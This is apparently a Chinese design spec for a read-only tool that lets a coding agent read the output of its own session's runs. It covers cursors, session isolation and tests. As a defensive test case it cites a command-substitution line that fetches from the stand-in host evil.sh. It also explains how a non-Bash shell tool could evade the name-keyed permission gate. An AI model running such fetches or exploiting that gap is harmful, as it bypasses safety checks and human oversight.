# 步骤 5：把 run 服务暴露成模型工具

> 上游：`2026-08-11-code-exec-runner-v4-design.md` §10「明确的取舍：模型看不到运行输出」
> 与 §11 落地顺序第 5 条。步骤 2/3/4 已合入 master。

## 1. 要解决的问题

现在的形态是：用户在网页上点「▶ 运行」→ 起一个 run → 输出流到右栏。**这条路径整个绕开了模型。**
后果写在步骤 3/4 两份 spec 的「已知代价」里，逐字相同：

> 模型仍然看不到运行输出（步骤 5 才解决）。报错要用户手工贴回聊天框。

也就是说「让模型写的代码在本机真实执行」这件事，目前只兑现了「执行」，没兑现「模型能据此迭代」。
用户跑出一个 traceback，得自己选中、复制、贴回聊天框，模型才知道发生了什么。

## 2. 实测事实

**全部来自命令输出，不是推断。** 这一节的每条都直接改变了下面的设计。

### 2.1 权限层的 Bash 安全闸是**按工具名字硬编码**的

```
$ grep -n "const isBash\|if (toolName === 'Bash')\|if (isBash && !hasWholeExactBashAllow" packages/core/src/permission.ts
291:  if (toolName === 'Bash') return matchCommand(p.specifier, specifier)
318:  const isBash = name === 'Bash' && specifier !== null
355:  if (isBash && !hasWholeExactBashAllow(allowRules, specifier!)) {
```

`decide()` 的判定顺序是「禁用 → deny → **Bash 安全闸** → bypass → allow → ask → defaultMode」。
第 318 行那个 `name === 'Bash'` 决定了三件事，**全部只对名字叫 `Bash` 的工具生效**：

1. 第 355 行的 23 项安全检查（命令替换、`$IFS`、进程替换、回车符…）；
2. deny/ask 的**逐子命令**比对 —— 没有它，`safe && evil` 只按整条前缀匹配，能绕过；
3. 第 291 行的 `matchCommand` 命令语义匹配 —— 没有它，限定符会被当**文件路径**去
   `resolve(cwd, …)` 再判 cwd 逃逸（`Tool.specifierKind` 的注释里记着这个坑的真实后果）。

**结论：任何新增的「拿一条 shell 命令去执行」的工具，只要不叫 `Bash`，就自动少掉这三层。**
在 `defaultMode: 'bypass'`（全自主）下这尤其致命 —— 第 355 行的闸是刻意排在 bypass **前面**的
（注释里写了为什么：挪到 bypass 后面等于全自主档把 15 条 block 检查整个跳过），
而一个新名字的工具压根进不了这个分支。

### 2.2 仓库里没有后台 Bash

```
$ grep -rn "run_in_background\|BashOutput" packages/tools/src
（零命中）
```

与 v4 §10 当时的记录一致。Bash 工具是阻塞的，且有上限：

```
$ grep -n "DEFAULT_TIMEOUT = \|MAX_TIMEOUT = \|HEAD_CHARS = \|TAIL_CHARS = " packages/tools/src/bash.ts
26:const DEFAULT_TIMEOUT = 120_000
28:const MAX_TIMEOUT = 600_000
34:const HEAD_CHARS = 10_000
35:const TAIL_CHARS = 20_000
```

即 120s 默认 / 600s 上限、输出预算 head 10k + tail 20k。**尾重头轻**的分配理由（失败摘要和
堆栈都在尾部）本步直接沿用，不另立一套。

### 2.3 `Run` 只能整份取快照，没有游标

```
$ sed -n '141,145p' packages/tools/src/run/run.ts
  /** 当前可见输出。中途接入的订阅者靠它补历史。 */
  snapshot(): { out: string; err: string } {
    return { out: this.sinks.out.snapshot(), err: this.sinks.err.snapshot() }
  }
```

`sinks` 是 `private`。`OutputSink` 上有 `totalChars`（**实际产生**的总字符数，
不是快照长度），但 `Run` 没把它转出去。

这直接决定了增量读的可行性 —— 见 §5。项目档的环形缓冲是 400_000 字符
（`PROJECT_POLICY.sink = { kind: 'ring', chars: 400_000 }`），片段档 200_000。
**一次全量回读就能把模型的上下文吃掉一大半。**

### 2.4 会话隔离只在 HTTP 层，工具层要自己再做一遍

```
$ grep -n "sessionId" packages/server/src/session/SessionManager.ts
147:  sessionId: string
231:  private readonly sessionId: string
321:    this.sessionId = opts.sessionId
```

`SessionManager` 手里有 sessionId；`SESSION_CAPABILITY_TOOLS` 那张清单就在同一个构造函数里
消费 `SessionCapabilityContext`。而另一条接缝没有：

```
$ grep -n "registerExtraTools?:" packages/server/src/session/createSession.ts
52:  registerExtraTools?: (registry: ToolRegistry) => void
```

**只有 registry，没有 sessionId。** 所以要做会话隔离，接缝必须选 `SESSION_CAPABILITY_TOOLS`。

### 2.5 注册表的构造顺序

```
$ grep -n "new SessionService\|new RunRegistry\|const registerExtraTools" packages/server/src/startServer.ts
72:  const registerExtraTools = (registry: ToolRegistry): void => {
152:  const service = new SessionService({
220:  const runs = new RunRegistry({
```

`RunRegistry` 在 `SessionService` **之后**才建。要把它喂给会话工具，得把 220 行那段上移到
152 行之前（它不依赖 service，纯粹是历史书写顺序）。这是本步唯一的挪动，别顺手做别的。

## 3. 范围决定：v1 **只读**

三个候选：

| | 做什么 | 代价 |
|---|---|---|
| **A. 只读** | 模型能列出本会话的 run、读它们的输出 | 不新增任何执行面 |
| B. 只读 + 起后台 run | 模型还能自己起 dev server / 长构建 | **必须先动 §2.1 的权限层**，否则开一个绕过安全闸的执行口 |
| C. 改造成 Bash 的后台模式 | 与 CC 的 `run_in_background` 同形 | 要改 `ToolResult` 形态，波及 core 工具协议（v4 §10 原话） |

**选 A。** 理由不是「A 更简单」，而是：

1. **A 恰好就是用户说的那件事** —— 「报错还得手工贴回聊天框」。B 和 C 解决的是另一个问题
   （模型想自己起长跑），而模型**已经有 Bash**，只是有 600s 上限。
2. **B 的代价被 §2.1 量出来了，不是拍脑袋。** 要做 B，正确做法是把 `permission.ts` 里三处
   `name === 'Bash'` 换成工具自己声明的标记（比如 `Tool.specifierKind: 'command'`），
   让安全闸按**性质**而不是按**名字**生效。那是一次独立的 core 改动，需要自己的变异测试
   （把标记去掉 → `Run("echo $(curl -s evil.sh)")` 必须重新变成 ask）。
   **混进本步会让「模型能看输出」这件小事挂在一次权限层重构上。**
3. A 做完之后 B 只是加一个工具，读侧不用重写。反过来不成立。

**写下代价，不留白**：v1 之后模型仍然不能自己起 dev server。想跑长命令还是 Bash + 600s 上限，
超了就超了。这是明知的缺口，编号为**步骤 5b**，前置条件是权限层去名字化。

## 4. 工具表面

一个工具：`RunOutput`。**只读**（`readOnly: true`、`parallelizable: true`）。

```jsonc
{
  "runId": "string?",   // 省略 = 列出本会话的所有 run
  "since": "number?",   // 从第几个字符起读（见 §5）；省略 = 从头
  "stream": "'out' | 'err' | 'both'?"   // 缺省 both
}
```

**为什么把「列出」和「读输出」塞进同一个工具而不是两个**：两个工具在模型侧要多占一份
description 预算，而它们的返回体是同一件事的两个粒度。更要紧的是 —— 模型不知道 runId
的时候**必须**先列，两个工具意味着它可能直接猜一个 id 调用第二个。合成一个，
「不给 id 就先给你看清单」是唯一可能的路径。

### 4.1 不给 runId：列清单

```
本会话有 2 个运行：

  #a3f21c8b  已结束 exit=1   (12 秒前)  pnpm test
  #7d0e94f2  运行中          (3 分钟前) pnpm dev

用 RunOutput({runId: "a3f21c8b"}) 读某一个的输出。
```

id 用**前 8 位**。`randomUUID()` 的完整值是 36 字符，四个 run 就 144 字符纯噪声；
8 位十六进制在单会话几十个 run 的量级下碰撞概率可以忽略。
**服务端按前缀匹配，撞了就报错让模型给更长的前缀** —— 而不是随便挑一个。

`command` 原样显示、**不截断**：命令本身就是模型认出「哪个是我要找的」的唯一依据，
截掉尾巴等于把 `pnpm test packages/core` 和 `pnpm test packages/web` 变成同一条。

### 4.2 给了 runId：读输出

```
运行 #a3f21c8b — pnpm test
状态：已结束，退出码 1（进程正常退出）
输出共 48213 字符，本次读取 [0, 30000)

--- stdout ---
…

--- stderr ---
…

还有 18213 字符未读。用 RunOutput({runId: "a3f21c8b", since: 30000}) 继续。
```

## 5. 游标：为什么是模型给偏移量，而不是服务端记

轮询是这个工具的**主要**用法（模型起了个构建，隔一会看一眼）。全量回读意味着第二次读
把前面读过的又灌一遍上下文。所以必须增量。两条路：

- **(a) 服务端记「这个会话上次读到哪」**：模型不用传参数。但状态是隐藏的 ——
  模型想重读前面看过的东西就再也读不到了，而「回头确认一下刚才那行报错」是真实需求。
- **(b) 模型传 `since` 偏移量**：显式、可重读、可测。

**选 (b)。** 但环形缓冲会从**头部**丢字符，所以偏移量必须定义在「**累计产生**」的坐标系里，
不是「当前快照的下标」—— 后者会在丢字符时整体平移，模型的游标会莫名其妙地倒退着读到重复内容。

`OutputSink` 上已经有这个坐标系：

- `totalChars` = 实际产生的总字符数（sink.ts 的注释原话：「不是快照长度」）
- `snapshot().length` = 当前还留着的
- 二者之差 = 已经被环形缓冲丢掉的前缀长度

于是：`dropped = totalChars - snapshot().length`。模型传 `since`：

| 情形 | 行为 |
|---|---|
| `since >= totalChars` | 返回空 + 「暂无新输出」 |
| `since >= dropped` | 从 `snapshot()[since - dropped]` 起给 |
| `since < dropped` | **明说** `[since, dropped)` 这段已被丢弃，从 `dropped` 起给 |

第三行那句「明说」是重点。**静默地从更靠后的位置开始给，模型会以为自己读到了连续的输出**，
然后对着一段中间缺了 20 万字符的日志做推断。宁可让它知道自己漏了。

**要动 `run.ts`**：加一个把 `totalChars` 一并转出的读取口。`snapshot()` 保持原样不动
（SSE 的 replay 在用它，那条路径不需要游标）。

### 5.1 单次读取的上限

沿用 Bash 的分配思路但**不照抄数值**：Bash 是 head 10k + tail 20k，因为它一次性把整条命令的
输出交出去、之后没有第二次机会。这里有游标，模型可以接着读，所以**不做 head/tail 两段式**——
两段式在有游标的场景下反而有害：中间挖掉一块之后，`since` 该给什么值就说不清了。

**单次上限 30_000 字符，连续一段，从 `since` 起。** 读不完就在末尾告诉模型还剩多少、
下次 `since` 传几。

**代价**：一个 400k 字符的 dev server 日志要读 14 次才能读完。**这是刻意的** ——
真需要全量读 400k 日志的场景不存在，模型要的是「最后那段报错」。所以再给一条：

`since` 允许**负数**，含义是「从末尾往前数 N 个字符」（`since: -5000` = 最后 5000 字符）。
这是模型 90% 的实际需求（「看看它报了什么错」），而正数游标服务于「从头顺着读」。
两种语义在同一个字段上，靠符号区分 —— 因为它们是同一件事（起点）的两种指定方式。

## 6. 会话隔离

**模型只能看到自己会话的 run。** 这不是可选的加固 —— 步骤 4 刚补过一轮同类的洞
（`4cd3c46 fix(server): run 端点的会话隔离（评审 M3/M6，都是已合入代码的洞）`），
HTTP 层三个路由都补了，工具层是**第四个入口**，漏了等于前面白补。

`RunRegistry.list()` 返回的 `RunSummary` 带 `sessionId`，按它过滤。给了 runId 但不属于本会话 →
**报「没有这个运行」，不报「无权访问」**：后者会把「别的会话存在一个 id 为 X 的 run」这个事实
泄露给模型，而模型的输出会进用户的聊天记录。

## 7. 接线

选 `SESSION_CAPABILITY_TOOLS`（§2.4 论证：另一条接缝拿不到 sessionId）。

1. `SessionCapabilityContext` 加两个字段：`sessionId: string`、`runs?: RunRegistry`
   （可选 —— TUI 那条路径没有 run 注册表，`enabled` 判据缺省不注册）
2. `SessionManager` 构造 `capabilityCtx` 时逐字段填上（**不用 spread**，
   那张清单的注释里写明了 spread 会绕过 TS 的多余属性检查、让改名静默变 undefined）
3. `SessionService` / `createSession` 把 `runs` 透传下去
4. `startServer.ts` 把 `new RunRegistry` 从 220 行上移到 `new SessionService` 之前

`RunOutput` 工具本身放 `packages/tools/src/run/outputTool.ts` —— 与 `RunRegistry` 同包，
不需要新的跨包依赖。

## 8. 模型怎么知道该去看

**这是本设计最可能失败的地方，单独列一节。**

工具存在 ≠ 模型会用。真实时序是：用户点运行 → 失败 → 用户打字「修一下」→
模型此时**必须自己想到**去调 `RunOutput`。想不到，这个功能就等于没做。

两条路：

- **(a) 只靠工具 description。** 零改动。风险：模型看到「修一下」可能直接去读代码猜，
  不去查有没有运行记录。
- **(b) 提交消息时注入一行现状。** 用户发消息时，若本会话有「在跑的」或「非零退出结束的」run，
  就在消息里附一行极短的提示（每个 run 一行：id / 命令 / 状态 / 退出码，**不含输出**）。

**选 (a) + (b)，但 (b) 严格限定**：只列 **在跑的** 和 **非零退出的**，最多 3 条，不带输出。
正常跑完（exit=0）的不提 —— 那种情况没什么要修的，提了只是噪声。

理由：(a) 单独不可靠，而不可靠的发现机制会让整个步骤 5 变成「有这个工具但从来没被调用过」。
(b) 的成本是每条消息最多 3 行，且只在真有异常 run 时才出现。

**代价**：(b) 要碰消息提交路径。如果实现时发现那条路径上没有干净的接缝，
**就先只做 (a) 并把 (b) 记成欠账**，不要为了它去改动提交流程的形状。

## 9. 明确不做

| 不做 | 为什么 | 什么时候做 |
|---|---|---|
| 模型起后台 run | §3，要先给权限层去名字化 | 步骤 5b |
| 模型停 run | 起都不能起，停谁？ | 跟 5b 一起 |
| 给模型 SSE / 推送 | 模型只在用户发消息时才动，推送没有接收方 | 不做 |
| ANSI 转义清理 | 实测 vitest 44 处 ESC —— 但那是**渲染**问题，另有欠账条目 | 独立排期 |
| 输出落盘 | `sink.ts` 明说本模块不落盘；游标 + 环形缓冲已经够 | 有人真被 400k 上限咬到再说 |

**ANSI 这条要多说一句**：模型读到的输出里会有转义序列。实测 `vitest` 输出 44 处 ESC，
`vite dev` 30 处。对模型来说这是纯噪声（还占 token）。**读侧应该剥掉**——
渲染侧要不要上色是另一个问题（那条欠账是「让红绿回来」，方向相反）。
所以 `RunOutput` 剥 ANSI，右栏不剥。两侧诉求相反，不要试图共用一个开关。

## 10. 测试要点

带 **[变异]** 的必须做变异验证：改坏实现 → 确认测试真的红 → 精确改回。

1. **[变异]** 会话隔离：A 会话的工具读 B 会话的 runId → 报「没有这个运行」。
   变异：把 sessionId 过滤去掉 → 必须红。
2. **[变异]** 游标越过丢弃区：ring sink 丢了前 100 字符，`since: 50` → 输出里**必须**出现
   「已被丢弃」字样，且内容从第 100 字符起。变异：改成静默从 100 起给 → 必须红。
3. 负数 `since`：`-5000` 取最后 5000 字符；`-999999`（超过总长）→ 从头给，不报错。
4. `since >= totalChars` → 「暂无新输出」，不是空字符串。
5. runId 前缀匹配：两个 run 的前 8 位相同 → 报「前缀不唯一」，**不能随便挑一个**。
6. 单次上限 30_000 + 尾部提示的 `since` 值**可直接用**（把提示里的数字传回去，
   下一段与上一段严丝合缝，不重不漏）—— 这条最容易差一。
7. ANSI 剥离：含 `\x1b[31m` 的输出经工具读出后不含 ESC。
8. 不给 runId → 列清单；本会话零个 run → 明确说「本会话还没有运行过命令」，
   不是空清单。
9. **真跑验证**（测试绿 ≠ 能用）：真浏览器点「▶ 运行 → 一个会失败的脚本」，
   然后在聊天框问「刚才那个跑挂了，为什么」，**看模型是否真的调用了 RunOutput 并读到了报错**。
   这条不能用单测代替 —— 它验的是 §8 的发现机制，而那是本设计最可能失败的地方。

## 11. 落地顺序

1. `Run` 加带 `totalChars` 的读取口（单独提交，不碰别的）
2. `RunOutput` 工具本体 + 单测（§10 的 1–8）
3. 接线：能力面加字段 + `startServer` 挪 `new RunRegistry`
4. §8(b) 的消息注入 —— 找不到干净接缝就跳过并记欠账
5. 真跑验证（§10.9），合本地 master，写 `docs/features.md`
